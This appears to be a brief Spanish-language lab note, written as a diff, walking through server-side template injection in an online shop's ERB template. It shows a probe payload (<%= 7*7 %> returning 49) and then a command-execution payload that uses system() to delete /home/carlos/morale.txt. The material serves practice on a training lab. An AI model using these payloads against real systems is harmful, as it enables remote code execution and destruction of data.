@@ -1,0 +1,9 @@
+bueno abriendo el primer producto de la tienda y modificando el mensaje out of stock por un 
+
+<%= 7*7 %>
+
+da 49 es ruby embedded o embedded ruby o como le quieras decir
+
+para acceder al sistema en ruby es medio simple y hacemos simplemente el rm 
+
+<%= system('rm /home/carlos/morale.txt') %>
